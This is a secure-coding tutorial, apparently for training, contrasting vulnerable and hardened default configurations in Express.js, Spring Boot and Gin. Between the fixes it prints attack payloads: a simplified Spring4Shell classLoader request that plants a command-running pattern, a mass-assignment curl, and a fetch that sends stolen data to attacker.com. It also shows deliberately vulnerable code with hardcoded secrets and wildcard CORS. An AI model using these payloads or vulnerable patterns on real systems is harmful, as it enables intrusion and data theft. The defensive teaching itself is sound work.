Express.js default configuration is designed for development convenience, NOT production security. Using defaults in production exposes your application to multiple attack vectors including information disclosure, session hijacking, and clickjacking.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const session = require('express-session');

const app = express();

// DANGEROUS: Using all defaults
app.use(session({
  secret: 'keyboard cat',  // Default/weak secret
  resave: false,
  saveUninitialized: true
  // Missing: secure, httpOnly, sameSite flags
}));

// DANGEROUS: No security headers configured
// X-Powered-By header is enabled by default (leaks Express)

app.get('/api/user/:id', (req, res) => {
  try {
    const user = getUserById(req.params.id);
    res.json(user);
  } catch (error) {
    // DANGEROUS: Exposes stack trace in production
    res.status(500).json({
      error: error.message,
      stack: error.stack  // Leaks internal paths and code structure
    });
  }
});

// DANGEROUS: Default error handler exposes details
app.use((err, req, res, next) => {
  res.status(500).send(err.stack);
});

app.listen(3000, () => {
  console.log('Server running on port 3000');
});
```

**Attack Reconnaissance Payload**:
```bash
# Fingerprint the server
curl -I http://target.com/api/user/1
# Response reveals: X-Powered-By: Express

# Trigger error to get stack trace
curl http://target.com/api/user/invalid'
# Response reveals internal file paths, Node.js version, dependencies
```

**Why This Is Dangerous**:
- `X-Powered-By: Express` header reveals technology stack for targeted exploits
- Default session secret is publicly known and allows session forgery
- Missing `secure` flag allows session cookies over HTTP (MITM attacks)
- Missing `httpOnly` flag enables JavaScript access to cookies (XSS theft)
- Stack traces reveal internal paths, code structure, and dependency versions
- No CSP, HSTS, or X-Frame-Options enables clickjacking and injection attacks

**SECURE VERSION**:

```javascript
const express = require('express');
const session = require('express-session');
const helmet = require('helmet');
const crypto = require('crypto');

const app = express();

// SECURITY: Disable X-Powered-By header
app.disable('x-powered-by');

// SECURITY: Apply security headers via Helmet
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'"],
      frameSrc: ["'none'"],
      objectSrc: ["'none'"]
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));

// SECURITY: Hardened session configuration
app.use(session({
  secret: process.env.SESSION_SECRET,  // From environment variable
  name: '__Host-sessionId',  // Cookie prefix for additional security
  resave: false,
  saveUninitialized: false,  // Don't create sessions until needed
  cookie: {
    secure: true,      // HTTPS only
    httpOnly: true,    // No JavaScript access
    sameSite: 'strict', // CSRF protection
    maxAge: 3600000,   // 1 hour expiry
    path: '/',
    domain: process.env.COOKIE_DOMAIN
  }
}));

app.get('/api/user/:id', (req, res) => {
  try {
    const user = getUserById(req.params.id);
    res.json(user);
  } catch (error) {
    // SECURITY: Log internally, return generic message
    console.error('User fetch error:', error);
    res.status(500).json({ error: 'An error occurred' });
  }
});

// SECURITY: Production error handler
app.use((err, req, res, next) => {
  console.error('Unhandled error:', err);
  res.status(500).json({ error: 'Internal server error' });
});

app.listen(3000);
```

**Key Security Controls**:
- **Helmet middleware**: Automatically sets 11+ security headers including CSP, HSTS, X-Frame-Options, X-Content-Type-Options
- **Hardened session cookies**: secure, httpOnly, sameSite flags prevent session theft via XSS, MITM, and CSRF
- **Environment-based secrets**: Session secrets from env vars, never hardcoded
- **Generic error responses**: Internal errors logged but not exposed to users

Environment-aware configuration is critical for maintaining security in production while keeping development productive. The key is implementing secure defaults that get progressively stricter, never the reverse.

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const session = require('express-session');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const RedisStore = require('connect-redis').default;
const { createClient } = require('redis');
const winston = require('winston');

// Environment detection
const NODE_ENV = process.env.NODE_ENV || 'development';
const isProduction = NODE_ENV === 'production';
const isTest = NODE_ENV === 'test';

// SECURITY: Validate required production secrets
if (isProduction) {
  const requiredEnvVars = ['SESSION_SECRET', 'REDIS_URL', 'COOKIE_DOMAIN'];
  const missing = requiredEnvVars.filter(v => !process.env[v]);
  if (missing.length > 0) {
    console.error(`FATAL: Missing required env vars: ${missing.join(', ')}`);
    process.exit(1);
  }
}

// Logging configuration - different levels per environment
const logger = winston.createLogger({
  level: isProduction ? 'warn' : 'debug',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.errors({ stack: !isProduction }),
    isProduction 
      ? winston.format.json() 
      : winston.format.prettyPrint()
  ),
  defaultMeta: { service: 'api-server', env: NODE_ENV },
  transports: [
    new winston.transports.Console(),
    ...(isProduction ? [
      new winston.transports.File({ filename: '/var/log/app/error.log', level: 'error' }),
      new winston.transports.File({ filename: '/var/log/app/audit.log', level: 'info' })
    ] : [])
  ]
});

const app = express();

// SECURITY: Always disable x-powered-by
app.disable('x-powered-by');

// SECURITY: Trust proxy only in production behind load balancer
if (isProduction) {
  app.set('trust proxy', 1);
}

// SECURITY: Environment-aware Helmet configuration
const helmetConfig = {
  contentSecurityPolicy: isProduction ? {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'"],
      imgSrc: ["'self'", 'data:'],
      connectSrc: ["'self'"],
      frameSrc: ["'none'"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: []
    }
  } : false,  // Disabled in dev for easier debugging
  hsts: isProduction ? {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  } : false
};
app.use(helmet(helmetConfig));

// SECURITY: Rate limiting - stricter in production
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: isProduction ? 100 : 1000,
  standardHeaders: true,
  legacyHeaders: false,
  handler: (req, res) => {
    logger.warn('Rate limit exceeded', {
      ip: req.ip,
      path: req.path,
      userAgent: req.get('User-Agent')
    });
    res.status(429).json({ error: 'Too many requests' });
  }
});
app.use('/api/', limiter);

// Session store - Redis in production, memory in dev
async function initializeSessionStore() {
  if (isProduction) {
    const redisClient = createClient({ url: process.env.REDIS_URL });
    await redisClient.connect();
    return new RedisStore({ client: redisClient, prefix: 'sess:' });
  }
  return undefined;  // Uses default MemoryStore in dev
}

async function configureApp() {
  const sessionStore = await initializeSessionStore();

  // SECURITY: Environment-specific session configuration
  const sessionConfig = {
    store: sessionStore,
    secret: process.env.SESSION_SECRET || (isProduction ? undefined : 'dev-secret-only'),
    name: isProduction ? '__Host-sid' : 'sid',
    resave: false,
    saveUninitialized: false,
    cookie: {
      secure: isProduction,
      httpOnly: true,
      sameSite: isProduction ? 'strict' : 'lax',
      maxAge: isProduction ? 3600000 : 86400000,
      ...(isProduction && { domain: process.env.COOKIE_DOMAIN })
    }
  };
  app.use(session(sessionConfig));

  // API routes
  app.get('/api/user/:id', (req, res) => {
    try {
      const user = getUserById(req.params.id);
      res.json(user);
    } catch (error) {
      logger.error('User fetch failed', {
        userId: req.params.id,
        error: error.message,
        stack: error.stack,
        requestId: req.id
      });

      // SECURITY: Different error responses per environment
      if (isProduction) {
        res.status(500).json({
          error: 'An error occurred',
          requestId: req.id  // For support correlation
        });
      } else {
        res.status(500).json({
          error: error.message,
          stack: error.stack
        });
      }
    }
  });

  // SECURITY: Global error handler with environment awareness
  app.use((err, req, res, next) => {
    const errorId = crypto.randomUUID();

    logger.error('Unhandled error', {
      errorId,
      error: err.message,
      stack: err.stack,
      path: req.path,
      method: req.method,
      ip: req.ip
    });

    if (isProduction) {
      res.status(500).json({
        error: 'Internal server error',
        errorId  // Reference for support tickets
      });
    } else {
      res.status(500).json({
        error: err.message,
        stack: err.stack,
        errorId
      });
    }
  });

  return app;
}

module.exports = { configureApp, logger };
```

**Defense in Depth Layers**:

1. **Configuration Validation Layer**:
```javascript
// Fail fast if production secrets are missing
if (isProduction && !process.env.SESSION_SECRET) {
  throw new Error('SESSION_SECRET required in production');
}
```

2. **Security Headers Layer**:
```javascript
// Always present but environment-tuned
app.use(helmet({
  contentSecurityPolicy: isProduction,
  crossOriginEmbedderPolicy: isProduction,
  crossOriginOpenerPolicy: isProduction
}));
```

3. **Error Sanitization Layer**:
```javascript
// Never leak internals in production
const sanitizeError = (err) => isProduction 
  ? { error: 'An error occurred' } 
  : { error: err.message, stack: err.stack };
```

**Additional Protections**:
- **Secret rotation**: Use AWS Secrets Manager or HashiCorp Vault for production secrets with automatic rotation
- **Configuration auditing**: Log all configuration at startup (without secrets) for debugging deploys
- **Health checks**: Expose `/health` endpoint that validates configuration without revealing details
- **Security monitoring**: Send security events (rate limits, auth failures) to SIEM via structured logging
- **Immutable infrastructure**: Use environment variables exclusively, never config files that could be modified

Using default configurations in Spring Boot can expose your application to serious security vulnerabilities. The Spring4Shell vulnerability (CVE-2022-22965) demonstrated how default data binding configurations allowed remote code execution affecting millions of applications.

**VULNERABLE CODE**:

```java
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.*;

@SpringBootApplication
public class UserApplication {
    public static void main(String[] args) {
        SpringApplication.run(UserApplication.class, args);
    }
}

@RestController
@RequestMapping("/api/users")
class UserController {

    // VULNERABLE: Default data binding accepts ALL parameters
    @PostMapping
    public String createUser(User user) {
        // Default binding allows class.module.classLoader access
        return "User created: " + user.getName();
    }
}

class User {
    private String name;
    private String email;
    private boolean isAdmin;  // Can be set by attacker!

    // Getters and setters
    public String getName() { return name; }
    public void setName(String name) { this.name = name; }
    public String getEmail() { return email; }
    public void setEmail(String email) { this.email = email; }
    public boolean isAdmin() { return isAdmin; }
    public void setIsAdmin(boolean isAdmin) { this.isAdmin = isAdmin; }
}
```

**Attack Payload**:
```bash
# Mass assignment attack - elevate to admin
curl -X POST http://localhost:8080/api/users \
  -d "name=hacker&email=evil@attacker.com&isAdmin=true"

# Spring4Shell RCE payload (simplified)
curl -X POST http://localhost:8080/api/users \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20%7D%25%7Bsuffix%7Di"
```

**Why This Is Dangerous**:
- Default data binding accepts any HTTP parameter and binds to object properties
- Attackers can set internal fields like `isAdmin` through mass assignment
- ClassLoader access through nested properties enables remote code execution
- Debug endpoints like `/actuator` are often exposed with default settings

**SECURE VERSION**:

```java
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.WebDataBinder;
import org.springframework.web.bind.annotation.*;
import javax.validation.Valid;
import javax.validation.constraints.*;

@SpringBootApplication
public class SecureUserApplication {
    public static void main(String[] args) {
        SpringApplication.run(SecureUserApplication.class, args);
    }
}

@RestController
@RequestMapping("/api/users")
class SecureUserController {

    // SECURITY: Restrict allowed fields for data binding
    @InitBinder
    public void initBinder(WebDataBinder binder) {
        binder.setAllowedFields("name", "email");  // Whitelist only safe fields
        binder.setDisallowedFields("isAdmin", "class.*", "Class.*", "*.class.*");
    }

    @PostMapping
    public String createUser(@Valid @RequestBody UserDTO userDto) {
        // Use DTO pattern - only transfer expected fields
        User user = new User();
        user.setName(userDto.getName());
        user.setEmail(userDto.getEmail());
        user.setIsAdmin(false);  // Explicitly set defaults

        return "User created: " + user.getName();
    }
}

// Use a DTO with validation - prevents mass assignment
class UserDTO {
    @NotBlank(message = "Name is required")
    @Size(min = 2, max = 100)
    private String name;

    @NotBlank(message = "Email is required")
    @Email(message = "Invalid email format")
    private String email;

    // Only include fields that should be user-controllable
    // NO isAdmin field here!

    public String getName() { return name; }
    public void setName(String name) { this.name = name; }
    public String getEmail() { return email; }
    public void setEmail(String email) { this.email = email; }
}
```

**Key Security Controls**:
- **@InitBinder with whitelist**: Only explicitly allowed fields can be bound from user input
- **DTO pattern**: Separate objects for input (DTO) and domain (Entity) prevent mass assignment
- **@Valid annotation**: Enforces validation rules before processing
- **Explicit defaults**: Security-sensitive fields are set programmatically, never from user input

Securing a production Spring Boot application requires a defense-in-depth approach covering actuator endpoints, security headers, error handling, and application properties. Here's a comprehensive production-ready configuration.

**PRODUCTION PATTERN**:

```java
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.security.web.header.writers.*;
import org.springframework.boot.actuate.autoconfigure.security.servlet.EndpointRequest;
import org.springframework.web.bind.WebDataBinder;
import org.springframework.web.bind.annotation.ControllerAdvice;
import org.springframework.web.bind.annotation.InitBinder;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.ExceptionHandler;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

@SpringBootApplication
public class SecureApplication {
    public static void main(String[] args) {
        // Disable potentially dangerous features
        System.setProperty("spring.jmx.enabled", "false");
        System.setProperty("spring.devtools.restart.enabled", "false");
        SpringApplication.run(SecureApplication.class, args);
    }
}

@Configuration
@EnableWebSecurity
class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // Disable CSRF only for stateless APIs with proper authentication
            .csrf(csrf -> csrf
                .ignoringRequestMatchers("/api/**")
            )

            // Secure actuator endpoints
            .authorizeHttpRequests(auth -> auth
                .requestMatchers(EndpointRequest.to("health", "info")).permitAll()
                .requestMatchers(EndpointRequest.toAnyEndpoint()).hasRole("ACTUATOR_ADMIN")
                .requestMatchers("/api/public/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )

            // Security headers
            .headers(headers -> headers
                .contentTypeOptions(contentType -> {})
                .xssProtection(xss -> xss.headerValue(XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK))
                .frameOptions(frame -> frame.deny())
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives("default-src 'self'; script-src 'self'; object-src 'none';")
                )
                .httpStrictTransportSecurity(hsts -> hsts
                    .includeSubDomains(true)
                    .maxAgeInSeconds(31536000)
                )
                .permissionsPolicy(permissions -> permissions
                    .policy("geolocation=(), microphone=(), camera=()")
                )
            )

            // Session management
            .sessionManagement(session -> session
                .maximumSessions(1)
                .maxSessionsPreventsLogin(true)
            );

        return http.build();
    }
}

// Global data binding protection
@ControllerAdvice
class GlobalSecurityAdvice {

    private static final Logger logger = LoggerFactory.getLogger(GlobalSecurityAdvice.class);

    // Block dangerous class loader access globally
    @InitBinder
    public void setDisallowedFields(WebDataBinder binder) {
        String[] denylist = {
            "class.*", "Class.*", "*.class.*", "*.Class.*",
            "class.module.*", "class.classLoader.*",
            "class.protectionDomain.*"
        };
        binder.setDisallowedFields(denylist);
        logger.debug("Global data binding protection applied");
    }

    // Secure error handling - never leak internal details
    @ExceptionHandler(Exception.class)
    public ResponseEntity<ErrorResponse> handleException(Exception ex) {
        logger.error("Unhandled exception: {}", ex.getMessage(), ex);

        ErrorResponse error = new ErrorResponse(
            "An error occurred",
            System.currentTimeMillis()
        );

        return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(error);
    }
}

class ErrorResponse {
    private String message;
    private long timestamp;

    public ErrorResponse(String message, long timestamp) {
        this.message = message;
        this.timestamp = timestamp;
    }

    public String getMessage() { return message; }
    public long getTimestamp() { return timestamp; }
}
```

**application-production.yml:**
```yaml
# Actuator security
management:
  endpoints:
    web:
      exposure:
        include: health,info,metrics,prometheus
      base-path: /internal/actuator  # Non-standard path
  endpoint:
    health:
      show-details: when_authorized
    env:
      enabled: false  # Disable environment exposure
    beans:
      enabled: false
    configprops:
      enabled: false
  server:
    port: 9090  # Separate port for actuator

# Error handling
server:
  error:
    include-stacktrace: never
    include-message: never
    include-exception: false
    include-binding-errors: never
  servlet:
    session:
      cookie:
        secure: true
        http-only: true
        same-site: strict

# Disable dangerous features
spring:
  jackson:
    default-property-inclusion: non_null
    serialization:
      fail-on-empty-beans: false
  jmx:
    enabled: false
  devtools:
    restart:
      enabled: false
  main:
    lazy-initialization: false

logging:
  level:
    org.springframework.security: INFO
    org.springframework.web: WARN
```

**Defense in Depth Layers**:

1. **Network Layer**: Actuator on separate port (9090) blocked by firewall from external access
```yaml
management:
  server:
    port: 9090
    address: 127.0.0.1  # Only localhost access
```

2. **Authentication Layer**: All sensitive endpoints require authentication
```java
.requestMatchers(EndpointRequest.toAnyEndpoint())
    .hasRole("ACTUATOR_ADMIN")
```

3. **Data Binding Layer**: Global protection against class loader attacks
```java
@InitBinder
public void setDisallowedFields(WebDataBinder binder) {
    binder.setDisallowedFields("class.*", "Class.*", "*.class.*");
}
```

**Additional Protections**:
- **Non-standard actuator path**: `/internal/actuator` instead of default `/actuator` reduces automated scanning success
- **Error message sanitization**: Never expose stack traces, exception types, or binding errors in production
- **Security headers**: HSTS, CSP, X-Frame-Options prevent client-side attacks
- **Session fixation protection**: Single session per user, secure cookie flags
- **Dependency scanning**: Regular `mvn dependency:check` for vulnerable libraries
- **Runtime monitoring**: Export metrics to Prometheus for anomaly detection

Your default Gin configuration is likely insecure for production. Default configurations in Go web frameworks expose debug information, use permissive CORS, and lack essential security controls that attackers actively exploit.

**VULNERABLE CODE**:

```go
package main

import (
	"database/sql"
	"log"
	"net/http"

	"github.com/gin-gonic/gin"
	_ "github.com/lib/pq"
)

var db *sql.DB

func main() {
	// VULNERABLE: Default Gin mode is debug
	router := gin.Default()

	// VULNERABLE: Default database connection with no encryption
	var err error
	db, err = sql.Open("postgres", "host=localhost user=admin password=admin123 dbname=app sslmode=disable")
	if err != nil {
		log.Fatal(err)
	}

	// VULNERABLE: Permissive CORS - allows all origins
	router.Use(func(c *gin.Context) {
		c.Writer.Header().Set("Access-Control-Allow-Origin", "*")
		c.Writer.Header().Set("Access-Control-Allow-Methods", "*")
		c.Writer.Header().Set("Access-Control-Allow-Headers", "*")
		c.Next()
	})

	// VULNERABLE: Debug endpoint exposed
	router.GET("/debug/vars", func(c *gin.Context) {
		c.JSON(200, gin.H{"db_host": "localhost", "api_key": "sk-secret-key"})
	})

	// VULNERABLE: Verbose error messages
	router.GET("/user/:id", getUser)

	// VULNERABLE: Default port, no TLS
	router.Run(":8080")
}

func getUser(c *gin.Context) {
	id := c.Param("id")
	var username string
	err := db.QueryRow("SELECT username FROM users WHERE id = $1", id).Scan(&username)
	if err != nil {
		// VULNERABLE: Exposes internal error details
		c.JSON(500, gin.H{"error": err.Error(), "query": "SELECT username FROM users WHERE id = " + id})
		return
	}
	c.JSON(200, gin.H{"username": username})
}
```

**Attack Payload**:
```bash
# Discover debug endpoints
curl http://target.com/debug/vars
# Response: {"db_host": "localhost", "api_key": "sk-secret-key"}

# Exploit permissive CORS from attacker site
fetch('http://target.com/user/1', {credentials: 'include'})
  .then(r => r.json())
  .then(data => fetch('https://attacker.com/steal?data=' + JSON.stringify(data)))

# Force error to leak database structure
curl http://target.com/user/invalid
# Response: {"error": "pq: invalid input syntax for type integer", "query": "SELECT username FROM users WHERE id = invalid"}
```

**Why This Is Dangerous**:
- Debug mode exposes stack traces and internal paths to attackers
- Wildcard CORS allows any website to make authenticated requests
- Default credentials (admin/admin123) are in public wordlists
- sslmode=disable allows database credential interception
- Verbose errors reveal database schema and query structure
- Debug endpoints leak secrets and configuration

**SECURE VERSION**:

```go
package main

import (
	"crypto/tls"
	"database/sql"
	"log"
	"net/http"
	"os"
	"time"

	"github.com/gin-gonic/gin"
	_ "github.com/lib/pq"
)

var db *sql.DB

func main() {
	// SECURE: Force release mode in production
	gin.SetMode(gin.ReleaseMode)

	router := gin.New()
	router.Use(gin.Recovery()) // Panic recovery without debug info

	// SECURE: Database with TLS and environment variables
	dbURL := os.Getenv("DATABASE_URL")
	if dbURL == "" {
		log.Fatal("DATABASE_URL environment variable required")
	}

	var err error
	db, err = sql.Open("postgres", dbURL+"?sslmode=require")
	if err != nil {
		log.Fatal("Database connection failed")
	}
	db.SetMaxOpenConns(25)
	db.SetMaxIdleConns(5)
	db.SetConnMaxLifetime(5 * time.Minute)

	// SECURE: Restrictive CORS
	router.Use(secureCORS())

	// SECURE: Security headers
	router.Use(securityHeaders())

	router.GET("/user/:id", getUser)

	// SECURE: TLS configuration
	tlsConfig := &tls.Config{
		MinVersion:               tls.VersionTLS12,
		PreferServerCipherSuites: true,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		},
	}

	server := &http.Server{
		Addr:         ":443",
		Handler:      router,
		TLSConfig:    tlsConfig,
		ReadTimeout:  10 * time.Second,
		WriteTimeout: 10 * time.Second,
		IdleTimeout:  120 * time.Second,
	}

	log.Fatal(server.ListenAndServeTLS("cert.pem", "key.pem"))
}

func secureCORS() gin.HandlerFunc {
	allowedOrigins := map[string]bool{
		"https://app.example.com":   true,
		"https://admin.example.com": true,
	}

	return func(c *gin.Context) {
		origin := c.Request.Header.Get("Origin")
		if allowedOrigins[origin] {
			c.Writer.Header().Set("Access-Control-Allow-Origin", origin)
			c.Writer.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE")
			c.Writer.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
			c.Writer.Header().Set("Access-Control-Allow-Credentials", "true")
			c.Writer.Header().Set("Access-Control-Max-Age", "86400")
		}
		if c.Request.Method == "OPTIONS" {
			c.AbortWithStatus(204)
			return
		}
		c.Next()
	}
}

func securityHeaders() gin.HandlerFunc {
	return func(c *gin.Context) {
		c.Writer.Header().Set("X-Content-Type-Options", "nosniff")
		c.Writer.Header().Set("X-Frame-Options", "DENY")
		c.Writer.Header().Set("X-XSS-Protection", "1; mode=block")
		c.Writer.Header().Set("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
		c.Writer.Header().Set("Content-Security-Policy", "default-src 'self'")
		c.Next()
	}
}

func getUser(c *gin.Context) {
	id := c.Param("id")
	var username string
	err := db.QueryRow("SELECT username FROM users WHERE id = $1", id).Scan(&username)
	if err != nil {
		// SECURE: Generic error message
		log.Printf("Database error for user %s: %v", id, err)
		c.JSON(500, gin.H{"error": "An internal error occurred"})
		return
	}
	c.JSON(200, gin.H{"username": username})
}
```

**Key Security Controls**:
- **Release Mode**: `gin.SetMode(gin.ReleaseMode)` disables debug output and stack traces
- **Environment Variables**: Secrets loaded from environment, never hardcoded
- **TLS Required**: Database connections use `sslmode=require`, server uses TLS 1.2+
- **Restrictive CORS**: Whitelist of allowed origins instead of wildcard
- **Security Headers**: HSTS, CSP, X-Frame-Options prevent common web attacks
- **Generic Errors**: Internal details logged server-side, not exposed to clients

Managing secure configurations across microservices requires a centralized, environment-aware approach with secure defaults that can't be accidentally overridden. Here's a production pattern used by organizations running hundreds of Go services.

**PRODUCTION PATTERN**:

```go
package config

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

// Environment represents deployment environment
type Environment string

const (
	EnvDevelopment Environment = "development"
	EnvStaging     Environment = "staging"
	EnvProduction  Environment = "production"
)

// SecureConfig holds all security-related configuration
type SecureConfig struct {
	Environment      Environment
	DebugEnabled     bool
	TLSConfig        *tls.Config
	CORSConfig       CORSConfig
	DatabaseConfig   DatabaseConfig
	RateLimitConfig  RateLimitConfig
	SecurityHeaders  map[string]string
	AllowedEndpoints map[string]bool
	mu               sync.RWMutex
}

type CORSConfig struct {
	AllowedOrigins   []string
	AllowedMethods   []string
	AllowedHeaders   []string
	AllowCredentials bool
	MaxAge           int
}

type DatabaseConfig struct {
	Host            string
	Port            int
	SSLMode         string
	MaxConnections  int
	ConnectTimeout  time.Duration
	CertPath        string
}

type RateLimitConfig struct {
	RequestsPerMinute int
	BurstSize         int
	Enabled           bool
}

var (
	globalConfig *SecureConfig
	configOnce   sync.Once
)

// GetSecureConfig returns singleton secure configuration
func GetSecureConfig() *SecureConfig {
	configOnce.Do(func() {
		globalConfig = loadSecureDefaults()
	})
	return globalConfig
}

// loadSecureDefaults creates configuration with secure defaults
// Production defaults are always secure - dev must explicitly opt-out
func loadSecureDefaults() *SecureConfig {
	env := getEnvironment()

	config := &SecureConfig{
		Environment: env,
		// SECURE DEFAULT: Debug disabled unless explicitly development
		DebugEnabled: env == EnvDevelopment,

		// SECURE DEFAULT: Strong TLS configuration
		TLSConfig: &tls.Config{
			MinVersion:               tls.VersionTLS12,
			PreferServerCipherSuites: true,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			},
		},

		// SECURE DEFAULT: Restrictive CORS
		CORSConfig: CORSConfig{
			AllowedOrigins:   []string{}, // Must be explicitly set
			AllowedMethods:   []string{"GET", "POST", "PUT", "DELETE"},
			AllowedHeaders:   []string{"Content-Type", "Authorization"},
			AllowCredentials: false, // Must be explicitly enabled
			MaxAge:           86400,
		},

		// SECURE DEFAULT: Database requires TLS
		DatabaseConfig: DatabaseConfig{
			SSLMode:        "verify-full", // Strongest by default
			MaxConnections: 25,
			ConnectTimeout: 10 * time.Second,
		},

		// SECURE DEFAULT: Rate limiting enabled
		RateLimitConfig: RateLimitConfig{
			RequestsPerMinute: 100,
			BurstSize:         20,
			Enabled:           true,
		},

		// SECURE DEFAULT: All security headers enabled
		SecurityHeaders: map[string]string{
			"X-Content-Type-Options":    "nosniff",
			"X-Frame-Options":           "DENY",
			"X-XSS-Protection":          "1; mode=block",
			"Referrer-Policy":           "strict-origin-when-cross-origin",
			"Content-Security-Policy":   "default-src 'self'; script-src 'self'; style-src 'self'",
			"Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
			"Permissions-Policy":        "geolocation=(), microphone=(), camera=()",
		},

		// SECURE DEFAULT: No debug endpoints allowed
		AllowedEndpoints: map[string]bool{
			"/debug/":   false,
			"/metrics":  false, // Must be explicitly enabled with auth
			"/profiler": false,
			"/swagger":  false,
		},
	}

	// Apply environment-specific overrides
	config.applyEnvironmentOverrides()

	// Validate configuration is secure for production
	if env == EnvProduction {
		if err := config.validateProductionSecurity(); err != nil {
			log.Fatalf("SECURITY VIOLATION: %v", err)
		}
	}

	return config
}

func getEnvironment() Environment {
	env := os.Getenv("APP_ENV")
	switch strings.ToLower(env) {
	case "development", "dev":
		return EnvDevelopment
	case "staging", "stage":
		return EnvStaging
	case "production", "prod":
		return EnvProduction
	default:
		// SECURE DEFAULT: Unknown environment treated as production
		log.Printf("WARNING: Unknown APP_ENV '%s', defaulting to production security", env)
		return EnvProduction
	}
}

func (c *SecureConfig) applyEnvironmentOverrides() {
	switch c.Environment {
	case EnvDevelopment:
		// Development can relax some controls
		c.DatabaseConfig.SSLMode = "prefer"
		c.CORSConfig.AllowedOrigins = []string{"http://localhost:3000", "http://localhost:8080"}
		c.AllowedEndpoints["/swagger"] = true
		c.AllowedEndpoints["/debug/"] = true

	case EnvStaging:
		// Staging mirrors production but allows metrics
		c.AllowedEndpoints["/metrics"] = true
		c.loadCORSFromEnv()
		c.loadDatabaseFromEnv()

	case EnvProduction:
		// Production: load from secure sources only
		c.loadCORSFromEnv()
		c.loadDatabaseFromEnv()
		c.loadTLSCertsFromVault()
	}
}

func (c *SecureConfig) loadCORSFromEnv() {
	origins := os.Getenv("CORS_ALLOWED_ORIGINS")
	if origins != "" {
		c.CORSConfig.AllowedOrigins = strings.Split(origins, ",")
	}
}

func (c *SecureConfig) loadDatabaseFromEnv() {
	c.DatabaseConfig.Host = os.Getenv("DB_HOST")
	c.DatabaseConfig.CertPath = os.Getenv("DB_SSL_CERT_PATH")
}

func (c *SecureConfig) loadTLSCertsFromVault() {
	// In production, load certs from HashiCorp Vault or similar
	vaultAddr := os.Getenv("VAULT_ADDR")
	if vaultAddr == "" {
		log.Fatal("VAULT_ADDR required in production")
	}
	// Implementation: fetch TLS certs from Vault
}

// validateProductionSecurity ensures production config is secure
func (c *SecureConfig) validateProductionSecurity() error {
	var violations []string

	// Check debug is disabled
	if c.DebugEnabled {
		violations = append(violations, "debug mode enabled in production")
	}

	// Check TLS version
	if c.TLSConfig.MinVersion < tls.VersionTLS12 {
		violations = append(violations, "TLS version below 1.2")
	}

	// Check database SSL
	if c.DatabaseConfig.SSLMode != "verify-full" && c.DatabaseConfig.SSLMode != "verify-ca" {
		violations = append(violations, "database SSL not set to verify-full or verify-ca")
	}

	// Check CORS isn't wildcard
	for _, origin := range c.CORSConfig.AllowedOrigins {
		if origin == "*" {
			violations = append(violations, "wildcard CORS origin not allowed in production")
		}
	}

	// Check debug endpoints are disabled
	for endpoint, enabled := range c.AllowedEndpoints {
		if enabled && strings.Contains(endpoint, "debug") {
			violations = append(violations, fmt.Sprintf("debug endpoint %s enabled in production", endpoint))
		}
	}

	// Check rate limiting is enabled
	if !c.RateLimitConfig.Enabled {
		violations = append(violations, "rate limiting disabled in production")
	}

	if len(violations) > 0 {
		return fmt.Errorf("security violations: %s", strings.Join(violations, "; "))
	}
	return nil
}

// ConfigAuditLog logs configuration for security auditing
func (c *SecureConfig) ConfigAuditLog() {
	audit := map[string]interface{}{
		"timestamp":      time.Now().UTC().Format(time.RFC3339),
		"environment":    c.Environment,
		"debug_enabled":  c.DebugEnabled,
		"tls_min_version": "TLS1.2",
		"db_ssl_mode":    c.DatabaseConfig.SSLMode,
		"rate_limiting":  c.RateLimitConfig.Enabled,
		"cors_origins":   len(c.CORSConfig.AllowedOrigins),
	}

	auditJSON, _ := json.Marshal(audit)
